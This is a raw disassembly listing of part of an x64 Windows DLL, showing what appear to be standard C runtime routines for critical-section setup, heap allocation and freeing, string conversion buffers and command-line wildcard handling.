   18000681b:	48 83 c4 20          	add    $0x20,%rsp
   18000681f:	5b                   	pop    %rbx
   180006820:	c3                   	ret
   180006821:	cc                   	int3
   180006822:	cc                   	int3
   180006823:	cc                   	int3
   180006824:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180006829:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000682e:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180006833:	57                   	push   %rdi
   180006834:	48 83 ec 30          	sub    $0x30,%rsp
   180006838:	49 8b f9             	mov    %r9,%rdi
   18000683b:	8b 0a                	mov    (%rdx),%ecx
   18000683d:	e8 d6 00 00 00       	call   0x180006918
   180006842:	90                   	nop
   180006843:	48 8d 1d 0e 45 01 00 	lea    0x1450e(%rip),%rbx        # 0x18001ad58
   18000684a:	48 8d 35 4f 38 01 00 	lea    0x1384f(%rip),%rsi        # 0x18001a0a0
   180006851:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180006856:	48 8d 05 03 45 01 00 	lea    0x14503(%rip),%rax        # 0x18001ad60
   18000685d:	48 3b d8             	cmp    %rax,%rbx
   180006860:	74 19                	je     0x18000687b
   180006862:	48 39 33             	cmp    %rsi,(%rbx)
   180006865:	74 0e                	je     0x180006875
   180006867:	48 8b d6             	mov    %rsi,%rdx
   18000686a:	48 8b cb             	mov    %rbx,%rcx
   18000686d:	e8 1a 39 00 00       	call   0x18000a18c
   180006872:	48 89 03             	mov    %rax,(%rbx)
   180006875:	48 83 c3 08          	add    $0x8,%rbx
   180006879:	eb d6                	jmp    0x180006851
   18000687b:	8b 0f                	mov    (%rdi),%ecx
   18000687d:	e8 ea 00 00 00       	call   0x18000696c
   180006882:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180006887:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   18000688c:	48 83 c4 30          	add    $0x30,%rsp
   180006890:	5f                   	pop    %rdi
   180006891:	c3                   	ret
   180006892:	cc                   	int3
   180006893:	cc                   	int3
   180006894:	b8 01 00 00 00       	mov    $0x1,%eax
   180006899:	87 05 b5 44 01 00    	xchg   %eax,0x144b5(%rip)        # 0x18001ad54
   18000689f:	c3                   	ret
   1800068a0:	4c 8b dc             	mov    %rsp,%r11
   1800068a3:	48 83 ec 28          	sub    $0x28,%rsp
   1800068a7:	b8 04 00 00 00       	mov    $0x4,%eax
   1800068ac:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   1800068b0:	4d 8d 43 08          	lea    0x8(%r11),%r8
   1800068b4:	89 44 24 38          	mov    %eax,0x38(%rsp)
   1800068b8:	49 8d 53 18          	lea    0x18(%r11),%rdx
   1800068bc:	89 44 24 40          	mov    %eax,0x40(%rsp)
   1800068c0:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   1800068c4:	e8 5b ff ff ff       	call   0x180006824
   1800068c9:	48 83 c4 28          	add    $0x28,%rsp
   1800068cd:	c3                   	ret
   1800068ce:	cc                   	int3
   1800068cf:	cc                   	int3
   1800068d0:	40 53                	rex push %rbx
   1800068d2:	48 83 ec 20          	sub    $0x20,%rsp
   1800068d6:	33 db                	xor    %ebx,%ebx
   1800068d8:	48 8d 15 81 44 01 00 	lea    0x14481(%rip),%rdx        # 0x18001ad60
   1800068df:	45 33 c0             	xor    %r8d,%r8d
   1800068e2:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   1800068e6:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   1800068ea:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   1800068ef:	e8 4c 20 00 00       	call   0x180008940
   1800068f4:	85 c0                	test   %eax,%eax
   1800068f6:	74 11                	je     0x180006909
   1800068f8:	ff 05 ba 46 01 00    	incl   0x146ba(%rip)        # 0x18001afb8
   1800068fe:	ff c3                	inc    %ebx
   180006900:	83 fb 0f             	cmp    $0xf,%ebx
   180006903:	72 d3                	jb     0x1800068d8
   180006905:	b0 01                	mov    $0x1,%al
   180006907:	eb 09                	jmp    0x180006912
   180006909:	33 c9                	xor    %ecx,%ecx
   18000690b:	e8 24 00 00 00       	call   0x180006934
   180006910:	32 c0                	xor    %al,%al
   180006912:	48 83 c4 20          	add    $0x20,%rsp
   180006916:	5b                   	pop    %rbx
   180006917:	c3                   	ret
   180006918:	48 63 c1             	movslq %ecx,%rax
   18000691b:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   18000691f:	48 8d 05 3a 44 01 00 	lea    0x1443a(%rip),%rax        # 0x18001ad60
   180006926:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   18000692a:	48 ff 25 6f 87 00 00 	rex.W jmp *0x876f(%rip)        # 0x18000f0a0
   180006931:	cc                   	int3
   180006932:	cc                   	int3
   180006933:	cc                   	int3
   180006934:	40 53                	rex push %rbx
   180006936:	48 83 ec 20          	sub    $0x20,%rsp
   18000693a:	8b 1d 78 46 01 00    	mov    0x14678(%rip),%ebx        # 0x18001afb8
   180006940:	eb 1d                	jmp    0x18000695f
   180006942:	48 8d 05 17 44 01 00 	lea    0x14417(%rip),%rax        # 0x18001ad60
   180006949:	ff cb                	dec    %ebx
   18000694b:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   18000694f:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   180006953:	ff 15 5f 87 00 00    	call   *0x875f(%rip)        # 0x18000f0b8
   180006959:	ff 0d 59 46 01 00    	decl   0x14659(%rip)        # 0x18001afb8
   18000695f:	85 db                	test   %ebx,%ebx
   180006961:	75 df                	jne    0x180006942
   180006963:	b0 01                	mov    $0x1,%al
   180006965:	48 83 c4 20          	add    $0x20,%rsp
   180006969:	5b                   	pop    %rbx
   18000696a:	c3                   	ret
   18000696b:	cc                   	int3
   18000696c:	48 63 c1             	movslq %ecx,%rax
   18000696f:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   180006973:	48 8d 05 e6 43 01 00 	lea    0x143e6(%rip),%rax        # 0x18001ad60
   18000697a:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   18000697e:	48 ff 25 23 87 00 00 	rex.W jmp *0x8723(%rip)        # 0x18000f0a8
   180006985:	cc                   	int3
   180006986:	cc                   	int3
   180006987:	cc                   	int3
   180006988:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   18000698f:	00 00 
   180006991:	48 8b 48 60          	mov    0x60(%rax),%rcx
   180006995:	8b 81 bc 00 00 00    	mov    0xbc(%rcx),%eax
   18000699b:	c1 e8 08             	shr    $0x8,%eax
   18000699e:	24 01                	and    $0x1,%al
   1800069a0:	c3                   	ret
   1800069a1:	cc                   	int3
   1800069a2:	cc                   	int3
   1800069a3:	cc                   	int3
   1800069a4:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1800069ab:	00 00 
   1800069ad:	48 8b 48 60          	mov    0x60(%rax),%rcx
   1800069b1:	48 8b 41 20          	mov    0x20(%rcx),%rax
   1800069b5:	8b 40 08             	mov    0x8(%rax),%eax
   1800069b8:	c1 e8 1f             	shr    $0x1f,%eax
   1800069bb:	c3                   	ret
   1800069bc:	40 53                	rex push %rbx
   1800069be:	48 83 ec 20          	sub    $0x20,%rsp
   1800069c2:	33 db                	xor    %ebx,%ebx
   1800069c4:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1800069c8:	e8 d7 ff ff ff       	call   0x1800069a4
   1800069cd:	84 c0                	test   %al,%al
   1800069cf:	75 0a                	jne    0x1800069db
   1800069d1:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800069d6:	e8 91 1e 00 00       	call   0x18000886c
   1800069db:	83 7c 24 30 01       	cmpl   $0x1,0x30(%rsp)
   1800069e0:	0f 95 c3             	setne  %bl
   1800069e3:	8b c3                	mov    %ebx,%eax
   1800069e5:	48 83 c4 20          	add    $0x20,%rsp
   1800069e9:	5b                   	pop    %rbx
   1800069ea:	c3                   	ret
   1800069eb:	cc                   	int3
   1800069ec:	cc                   	int3
   1800069ed:	cc                   	int3
   1800069ee:	cc                   	int3
   1800069ef:	cc                   	int3
   1800069f0:	40 53                	rex push %rbx
   1800069f2:	48 83 ec 20          	sub    $0x20,%rsp
   1800069f6:	4c 8b c2             	mov    %rdx,%r8
   1800069f9:	48 8b d9             	mov    %rcx,%rbx
   1800069fc:	48 85 c9             	test   %rcx,%rcx
   1800069ff:	74 0e                	je     0x180006a0f
   180006a01:	33 d2                	xor    %edx,%edx
   180006a03:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   180006a07:	48 f7 f3             	div    %rbx
   180006a0a:	49 3b c0             	cmp    %r8,%rax
   180006a0d:	72 43                	jb     0x180006a52
   180006a0f:	49 0f af d8          	imul   %r8,%rbx
   180006a13:	b8 01 00 00 00       	mov    $0x1,%eax
   180006a18:	48 85 db             	test   %rbx,%rbx
   180006a1b:	48 0f 44 d8          	cmove  %rax,%rbx
   180006a1f:	eb 15                	jmp    0x180006a36
   180006a21:	e8 5a 3c 00 00       	call   0x18000a680
   180006a26:	85 c0                	test   %eax,%eax
   180006a28:	74 28                	je     0x180006a52
   180006a2a:	48 8b cb             	mov    %rbx,%rcx
   180006a2d:	e8 de 24 00 00       	call   0x180008f10
   180006a32:	85 c0                	test   %eax,%eax
   180006a34:	74 1c                	je     0x180006a52
   180006a36:	48 8b 0d 8b 46 01 00 	mov    0x1468b(%rip),%rcx        # 0x18001b0c8
   180006a3d:	4c 8b c3             	mov    %rbx,%r8
   180006a40:	ba 08 00 00 00       	mov    $0x8,%edx
   180006a45:	ff 15 f5 86 00 00    	call   *0x86f5(%rip)        # 0x18000f140
   180006a4b:	48 85 c0             	test   %rax,%rax
   180006a4e:	74 d1                	je     0x180006a21
   180006a50:	eb 0d                	jmp    0x180006a5f
   180006a52:	e8 9d f6 ff ff       	call   0x1800060f4
   180006a57:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   180006a5d:	33 c0                	xor    %eax,%eax
   180006a5f:	48 83 c4 20          	add    $0x20,%rsp
   180006a63:	5b                   	pop    %rbx
   180006a64:	c3                   	ret
   180006a65:	cc                   	int3
   180006a66:	cc                   	int3
   180006a67:	cc                   	int3
   180006a68:	cc                   	int3
   180006a69:	cc                   	int3
   180006a6a:	cc                   	int3
   180006a6b:	cc                   	int3
   180006a6c:	cc                   	int3
   180006a6d:	cc                   	int3
   180006a6e:	cc                   	int3
   180006a6f:	cc                   	int3
   180006a70:	48 85 c9             	test   %rcx,%rcx
   180006a73:	74 36                	je     0x180006aab
   180006a75:	53                   	push   %rbx
   180006a76:	48 83 ec 20          	sub    $0x20,%rsp
   180006a7a:	4c 8b c1             	mov    %rcx,%r8
   180006a7d:	33 d2                	xor    %edx,%edx
   180006a7f:	48 8b 0d 42 46 01 00 	mov    0x14642(%rip),%rcx        # 0x18001b0c8
   180006a86:	ff 15 bc 86 00 00    	call   *0x86bc(%rip)        # 0x18000f148
   180006a8c:	85 c0                	test   %eax,%eax
   180006a8e:	75 16                	jne    0x180006aa6
   180006a90:	ff 15 da 85 00 00    	call   *0x85da(%rip)        # 0x18000f070
   180006a96:	8b c8                	mov    %eax,%ecx
   180006a98:	e8 17 f5 ff ff       	call   0x180005fb4
   180006a9d:	8b d8                	mov    %eax,%ebx
   180006a9f:	e8 50 f6 ff ff       	call   0x1800060f4
   180006aa4:	89 18                	mov    %ebx,(%rax)
   180006aa6:	48 83 c4 20          	add    $0x20,%rsp
   180006aaa:	5b                   	pop    %rbx
   180006aab:	c3                   	ret
   180006aac:	cc                   	int3
   180006aad:	cc                   	int3
   180006aae:	cc                   	int3
   180006aaf:	cc                   	int3
   180006ab0:	cc                   	int3
   180006ab1:	cc                   	int3
   180006ab2:	cc                   	int3
   180006ab3:	cc                   	int3
   180006ab4:	cc                   	int3
   180006ab5:	cc                   	int3
   180006ab6:	cc                   	int3
   180006ab7:	cc                   	int3
   180006ab8:	cc                   	int3
   180006ab9:	cc                   	int3
   180006aba:	cc                   	int3
   180006abb:	cc                   	int3
   180006abc:	cc                   	int3
   180006abd:	cc                   	int3
   180006abe:	cc                   	int3
   180006abf:	cc                   	int3
   180006ac0:	48 8b 05 01 46 01 00 	mov    0x14601(%rip),%rax        # 0x18001b0c8
   180006ac7:	c3                   	ret
   180006ac8:	48 3b ca             	cmp    %rdx,%rcx
   180006acb:	73 04                	jae    0x180006ad1
   180006acd:	83 c8 ff             	or     $0xffffffff,%eax
   180006ad0:	c3                   	ret
   180006ad1:	33 c0                	xor    %eax,%eax
   180006ad3:	48 3b ca             	cmp    %rdx,%rcx
   180006ad6:	0f 97 c0             	seta   %al
   180006ad9:	c3                   	ret
   180006ada:	cc                   	int3
   180006adb:	cc                   	int3
   180006adc:	48 8b c4             	mov    %rsp,%rax
   180006adf:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180006ae3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180006ae7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180006aeb:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180006aef:	41 56                	push   %r14
   180006af1:	48 83 ec 30          	sub    $0x30,%rsp
   180006af5:	45 33 f6             	xor    %r14d,%r14d
   180006af8:	41 8b e9             	mov    %r9d,%ebp
   180006afb:	48 8b da             	mov    %rdx,%rbx
   180006afe:	48 8b f9             	mov    %rcx,%rdi
   180006b01:	48 85 c9             	test   %rcx,%rcx
   180006b04:	75 24                	jne    0x180006b2a
   180006b06:	44 38 72 28          	cmp    %r14b,0x28(%rdx)
   180006b0a:	74 0d                	je     0x180006b19
   180006b0c:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   180006b10:	e8 5b ff ff ff       	call   0x180006a70
   180006b15:	44 88 73 28          	mov    %r14b,0x28(%rbx)
   180006b19:	4c 89 73 10          	mov    %r14,0x10(%rbx)
   180006b1d:	4c 89 73 18          	mov    %r14,0x18(%rbx)
   180006b21:	4c 89 73 20          	mov    %r14,0x20(%rbx)
   180006b25:	e9 32 01 00 00       	jmp    0x180006c5c
   180006b2a:	44 38 31             	cmp    %r14b,(%rcx)
   180006b2d:	75 60                	jne    0x180006b8f
   180006b2f:	4c 39 72 18          	cmp    %r14,0x18(%rdx)
   180006b33:	75 50                	jne    0x180006b85
   180006b35:	44 38 72 28          	cmp    %r14b,0x28(%rdx)
   180006b39:	74 0d                	je     0x180006b48
   180006b3b:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   180006b3f:	e8 2c ff ff ff       	call   0x180006a70
   180006b44:	44 88 73 28          	mov    %r14b,0x28(%rbx)
   180006b48:	b9 02 00 00 00       	mov    $0x2,%ecx
   180006b4d:	e8 9e 2c 00 00       	call   0x1800097f0
   180006b52:	48 89 43 10          	mov    %rax,0x10(%rbx)
   180006b56:	48 8b c8             	mov    %rax,%rcx
   180006b59:	48 f7 d9             	neg    %rcx
   180006b5c:	1b d2                	sbb    %edx,%edx
   180006b5e:	f7 d2                	not    %edx
   180006b60:	83 e2 0c             	and    $0xc,%edx
   180006b63:	48 85 c0             	test   %rax,%rax
   180006b66:	0f 95 c1             	setne  %cl
   180006b69:	41 0f 45 d6          	cmovne %r14d,%edx
   180006b6d:	88 4b 28             	mov    %cl,0x28(%rbx)
   180006b70:	49 8b ce             	mov    %r14,%rcx
   180006b73:	0f 95 c1             	setne  %cl
   180006b76:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
   180006b7a:	85 d2                	test   %edx,%edx
   180006b7c:	74 07                	je     0x180006b85
   180006b7e:	8b c2                	mov    %edx,%eax
   180006b80:	e9 d9 00 00 00       	jmp    0x180006c5e
   180006b85:	48 8b 43 10          	mov    0x10(%rbx),%rax
   180006b89:	66 44 89 30          	mov    %r14w,(%rax)
   180006b8d:	eb 92                	jmp    0x180006b21
   180006b8f:	41 83 c9 ff          	or     $0xffffffff,%r9d
   180006b93:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   180006b98:	4c 8b c7             	mov    %rdi,%r8
   180006b9b:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   180006ba0:	8b cd                	mov    %ebp,%ecx
   180006ba2:	41 8d 51 0a          	lea    0xa(%r9),%edx
   180006ba6:	e8 e1 17 00 00       	call   0x18000838c
   180006bab:	48 63 f0             	movslq %eax,%rsi
   180006bae:	85 c0                	test   %eax,%eax
   180006bb0:	75 19                	jne    0x180006bcb
   180006bb2:	ff 15 b8 84 00 00    	call   *0x84b8(%rip)        # 0x18000f070
   180006bb8:	8b c8                	mov    %eax,%ecx
   180006bba:	e8 c5 f4 ff ff       	call   0x180006084
   180006bbf:	e8 30 f5 ff ff       	call   0x1800060f4
   180006bc4:	8b 00                	mov    (%rax),%eax
   180006bc6:	e9 93 00 00 00       	jmp    0x180006c5e
   180006bcb:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   180006bcf:	48 3b f2             	cmp    %rdx,%rsi
   180006bd2:	76 57                	jbe    0x180006c2b
   180006bd4:	44 38 73 28          	cmp    %r14b,0x28(%rbx)
   180006bd8:	74 0d                	je     0x180006be7
   180006bda:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   180006bde:	e8 8d fe ff ff       	call   0x180006a70
   180006be3:	44 88 73 28          	mov    %r14b,0x28(%rbx)
   180006be7:	48 8d 0c 36          	lea    (%rsi,%rsi,1),%rcx
   180006beb:	e8 00 2c 00 00       	call   0x1800097f0
   180006bf0:	48 89 43 10          	mov    %rax,0x10(%rbx)
   180006bf4:	48 8b c8             	mov    %rax,%rcx
   180006bf7:	48 f7 d9             	neg    %rcx
   180006bfa:	48 8b c8             	mov    %rax,%rcx
   180006bfd:	48 1b d2             	sbb    %rdx,%rdx
   180006c00:	48 23 d6             	and    %rsi,%rdx
   180006c03:	48 f7 d9             	neg    %rcx
   180006c06:	45 1b c0             	sbb    %r8d,%r8d
   180006c09:	41 f7 d0             	not    %r8d
   180006c0c:	41 83 e0 0c          	and    $0xc,%r8d
   180006c10:	48 85 c0             	test   %rax,%rax
   180006c13:	0f 95 c1             	setne  %cl
   180006c16:	45 0f 45 c6          	cmovne %r14d,%r8d
   180006c1a:	88 4b 28             	mov    %cl,0x28(%rbx)
   180006c1d:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   180006c21:	45 85 c0             	test   %r8d,%r8d
   180006c24:	74 05                	je     0x180006c2b
   180006c26:	41 8b c0             	mov    %r8d,%eax
   180006c29:	eb 33                	jmp    0x180006c5e
   180006c2b:	48 8b 43 10          	mov    0x10(%rbx),%rax
   180006c2f:	41 83 c9 ff          	or     $0xffffffff,%r9d
   180006c33:	89 54 24 28          	mov    %edx,0x28(%rsp)
   180006c37:	4c 8b c7             	mov    %rdi,%r8
   180006c3a:	8b cd                	mov    %ebp,%ecx
   180006c3c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180006c41:	41 8d 51 0a          	lea    0xa(%r9),%edx
   180006c45:	e8 42 17 00 00       	call   0x18000838c
   180006c4a:	48 98                	cltq
   180006c4c:	48 85 c0             	test   %rax,%rax
   180006c4f:	0f 84 5d ff ff ff    	je     0x180006bb2
   180006c55:	48 ff c8             	dec    %rax
   180006c58:	48 89 43 20          	mov    %rax,0x20(%rbx)
   180006c5c:	33 c0                	xor    %eax,%eax
   180006c5e:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180006c63:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   180006c68:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   180006c6d:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   180006c72:	48 83 c4 30          	add    $0x30,%rsp
   180006c76:	41 5e                	pop    %r14
   180006c78:	c3                   	ret
   180006c79:	cc                   	int3
   180006c7a:	cc                   	int3
   180006c7b:	cc                   	int3
   180006c7c:	48 8b c4             	mov    %rsp,%rax
   180006c7f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180006c83:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180006c87:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180006c8b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180006c8f:	41 56                	push   %r14
   180006c91:	48 83 ec 40          	sub    $0x40,%rsp
   180006c95:	45 33 f6             	xor    %r14d,%r14d
   180006c98:	41 8b e9             	mov    %r9d,%ebp
   180006c9b:	48 8b da             	mov    %rdx,%rbx
   180006c9e:	48 8b f9             	mov    %rcx,%rdi
   180006ca1:	48 85 c9             	test   %rcx,%rcx
   180006ca4:	75 24                	jne    0x180006cca
   180006ca6:	44 38 72 28          	cmp    %r14b,0x28(%rdx)
   180006caa:	74 0d                	je     0x180006cb9
   180006cac:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   180006cb0:	e8 bb fd ff ff       	call   0x180006a70
   180006cb5:	44 88 73 28          	mov    %r14b,0x28(%rbx)
   180006cb9:	4c 89 73 10          	mov    %r14,0x10(%rbx)
   180006cbd:	4c 89 73 18          	mov    %r14,0x18(%rbx)
   180006cc1:	4c 89 73 20          	mov    %r14,0x20(%rbx)
   180006cc5:	e9 41 01 00 00       	jmp    0x180006e0b
   180006cca:	66 44 39 31          	cmp    %r14w,(%rcx)
   180006cce:	75 5f                	jne    0x180006d2f
   180006cd0:	4c 39 72 18          	cmp    %r14,0x18(%rdx)
   180006cd4:	75 50                	jne    0x180006d26
   180006cd6:	44 38 72 28          	cmp    %r14b,0x28(%rdx)
   180006cda:	74 0d                	je     0x180006ce9
   180006cdc:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   180006ce0:	e8 8b fd ff ff       	call   0x180006a70
   180006ce5:	44 88 73 28          	mov    %r14b,0x28(%rbx)
   180006ce9:	b9 01 00 00 00       	mov    $0x1,%ecx
   180006cee:	e8 fd 2a 00 00       	call   0x1800097f0
   180006cf3:	48 89 43 10          	mov    %rax,0x10(%rbx)
   180006cf7:	48 8b c8             	mov    %rax,%rcx
   180006cfa:	48 f7 d9             	neg    %rcx
   180006cfd:	1b d2                	sbb    %edx,%edx
   180006cff:	f7 d2                	not    %edx
   180006d01:	83 e2 0c             	and    $0xc,%edx
   180006d04:	48 85 c0             	test   %rax,%rax
   180006d07:	0f 95 c1             	setne  %cl
   180006d0a:	41 0f 45 d6          	cmovne %r14d,%edx
   180006d0e:	88 4b 28             	mov    %cl,0x28(%rbx)
   180006d11:	49 8b ce             	mov    %r14,%rcx
   180006d14:	0f 95 c1             	setne  %cl
   180006d17:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
   180006d1b:	85 d2                	test   %edx,%edx
   180006d1d:	74 07                	je     0x180006d26
   180006d1f:	8b c2                	mov    %edx,%eax
   180006d21:	e9 e7 00 00 00       	jmp    0x180006e0d
   180006d26:	48 8b 43 10          	mov    0x10(%rbx),%rax
   180006d2a:	44 88 30             	mov    %r14b,(%rax)
   180006d2d:	eb 92                	jmp    0x180006cc1
   180006d2f:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   180006d34:	41 83 c9 ff          	or     $0xffffffff,%r9d
   180006d38:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   180006d3d:	4c 8b c7             	mov    %rdi,%r8
   180006d40:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   180006d45:	33 d2                	xor    %edx,%edx
   180006d47:	8b cd                	mov    %ebp,%ecx
   180006d49:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   180006d4e:	e8 c9 16 00 00       	call   0x18000841c
   180006d53:	48 63 f0             	movslq %eax,%rsi
   180006d56:	85 c0                	test   %eax,%eax
   180006d58:	75 19                	jne    0x180006d73
   180006d5a:	ff 15 10 83 00 00    	call   *0x8310(%rip)        # 0x18000f070
   180006d60:	8b c8                	mov    %eax,%ecx
   180006d62:	e8 1d f3 ff ff       	call   0x180006084
   180006d67:	e8 88 f3 ff ff       	call   0x1800060f4
   180006d6c:	8b 00                	mov    (%rax),%eax
   180006d6e:	e9 9a 00 00 00       	jmp    0x180006e0d
   180006d73:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   180006d77:	48 3b f2             	cmp    %rdx,%rsi
   180006d7a:	76 56                	jbe    0x180006dd2
   180006d7c:	44 38 73 28          	cmp    %r14b,0x28(%rbx)
   180006d80:	74 0d                	je     0x180006d8f
   180006d82:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   180006d86:	e8 e5 fc ff ff       	call   0x180006a70
   180006d8b:	44 88 73 28          	mov    %r14b,0x28(%rbx)
   180006d8f:	48 8b ce             	mov    %rsi,%rcx
   180006d92:	e8 59 2a 00 00       	call   0x1800097f0
   180006d97:	48 89 43 10          	mov    %rax,0x10(%rbx)
   180006d9b:	48 8b c8             	mov    %rax,%rcx
   180006d9e:	48 f7 d9             	neg    %rcx
   180006da1:	48 8b c8             	mov    %rax,%rcx
   180006da4:	48 1b d2             	sbb    %rdx,%rdx
   180006da7:	48 23 d6             	and    %rsi,%rdx
   180006daa:	48 f7 d9             	neg    %rcx
   180006dad:	45 1b c0             	sbb    %r8d,%r8d
   180006db0:	41 f7 d0             	not    %r8d
   180006db3:	41 83 e0 0c          	and    $0xc,%r8d
   180006db7:	48 85 c0             	test   %rax,%rax
   180006dba:	0f 95 c1             	setne  %cl
   180006dbd:	45 0f 45 c6          	cmovne %r14d,%r8d
   180006dc1:	88 4b 28             	mov    %cl,0x28(%rbx)
   180006dc4:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   180006dc8:	45 85 c0             	test   %r8d,%r8d
   180006dcb:	74 05                	je     0x180006dd2
   180006dcd:	41 8b c0             	mov    %r8d,%eax
   180006dd0:	eb 3b                	jmp    0x180006e0d
   180006dd2:	48 8b 43 10          	mov    0x10(%rbx),%rax
   180006dd6:	41 83 c9 ff          	or     $0xffffffff,%r9d
   180006dda:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   180006ddf:	4c 8b c7             	mov    %rdi,%r8
   180006de2:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   180006de7:	8b cd                	mov    %ebp,%ecx
   180006de9:	89 54 24 28          	mov    %edx,0x28(%rsp)
   180006ded:	33 d2                	xor    %edx,%edx
   180006def:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180006df4:	e8 23 16 00 00       	call   0x18000841c
   180006df9:	48 98                	cltq
   180006dfb:	48 85 c0             	test   %rax,%rax
   180006dfe:	0f 84 56 ff ff ff    	je     0x180006d5a
   180006e04:	48 ff c8             	dec    %rax
   180006e07:	48 89 43 20          	mov    %rax,0x20(%rbx)
   180006e0b:	33 c0                	xor    %eax,%eax
   180006e0d:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180006e12:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   180006e17:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   180006e1c:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   180006e21:	48 83 c4 40          	add    $0x40,%rsp
   180006e25:	41 5e                	pop    %r14
   180006e27:	c3                   	ret
   180006e28:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180006e2d:	55                   	push   %rbp
   180006e2e:	56                   	push   %rsi
   180006e2f:	57                   	push   %rdi
   180006e30:	41 54                	push   %r12
   180006e32:	41 55                	push   %r13
   180006e34:	41 56                	push   %r14
   180006e36:	41 57                	push   %r15
   180006e38:	48 8b ec             	mov    %rsp,%rbp
   180006e3b:	48 83 ec 50          	sub    $0x50,%rsp
   180006e3f:	45 33 ff             	xor    %r15d,%r15d
   180006e42:	4c 8b ea             	mov    %rdx,%r13
   180006e45:	48 8b d9             	mov    %rcx,%rbx
   180006e48:	48 85 d2             	test   %rdx,%rdx
   180006e4b:	75 17                	jne    0x180006e64
   180006e4d:	e8 a2 f2 ff ff       	call   0x1800060f4
   180006e52:	41 8d 5d 16          	lea    0x16(%r13),%ebx
   180006e56:	89 18                	mov    %ebx,(%rax)
   180006e58:	e8 ef f0 ff ff       	call   0x180005f4c
   180006e5d:	8b c3                	mov    %ebx,%eax
   180006e5f:	e9 d0 01 00 00       	jmp    0x180007034
   180006e64:	0f 57 c0             	xorps  %xmm0,%xmm0
   180006e67:	4c 89 3a             	mov    %r15,(%rdx)
   180006e6a:	48 8b 01             	mov    (%rcx),%rax
   180006e6d:	f3 0f 7f 45 e0       	movdqu %xmm0,-0x20(%rbp)
   180006e72:	4c 89 7d f0          	mov    %r15,-0x10(%rbp)
   180006e76:	eb 77                	jmp    0x180006eef
   180006e78:	48 8d 55 48          	lea    0x48(%rbp),%rdx
   180006e7c:	66 c7 45 48 2a 3f    	movw   $0x3f2a,0x48(%rbp)
   180006e82:	48 8b c8             	mov    %rax,%rcx
   180006e85:	44 88 7d 4a          	mov    %r15b,0x4a(%rbp)
   180006e89:	e8 a2 3d 00 00       	call   0x18000ac30
   180006e8e:	48 8b 0b             	mov    (%rbx),%rcx
   180006e91:	48 85 c0             	test   %rax,%rax
   180006e94:	75 3c                	jne    0x180006ed2
   180006e96:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   180006e9a:	45 33 c0             	xor    %r8d,%r8d
   180006e9d:	33 d2                	xor    %edx,%edx
   180006e9f:	e8 c0 01 00 00       	call   0x180007064
   180006ea4:	8b f0                	mov    %eax,%esi
   180006ea6:	85 c0                	test   %eax,%eax
   180006ea8:	74 3e                	je     0x180006ee8
   180006eaa:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
   180006eae:	48 8b df             	mov    %rdi,%rbx
   180006eb1:	48 3b 7d e8          	cmp    -0x18(%rbp),%rdi
   180006eb5:	0f 84 bc 00 00 00    	je     0x180006f77
   180006ebb:	48 8b 0b             	mov    (%rbx),%rcx
   180006ebe:	e8 ad fb ff ff       	call   0x180006a70
   180006ec3:	48 83 c3 08          	add    $0x8,%rbx
